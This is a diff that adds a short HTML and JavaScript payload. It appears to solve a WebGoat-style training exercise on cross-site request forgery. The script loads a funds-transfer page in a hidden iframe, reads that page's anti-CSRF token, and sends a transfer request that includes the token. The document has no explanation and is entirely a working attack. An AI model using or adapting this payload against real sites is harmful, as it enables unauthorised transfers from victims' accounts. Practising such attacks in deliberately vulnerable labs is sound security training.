@@ -1,0 +1,9 @@
+<script type="text/javascript">
+function obtain_token() {
+  var transfer_page,token_value;
+  transfer_page=document.getElementById("transfer_funds");
+  token_value=transfer_page.contentDocument.getElementsByName("token")[0].value;
+  transfer_page.src="attack?Screen=1469770765&menu=900&transfer=1145141919810&token="+token_value;
+}
+</script> 
+<iframe src="attack?Screen=1469770765&menu=900&transfer=main" onload="obtain_token()" id="transfer_funds"> </iframe>
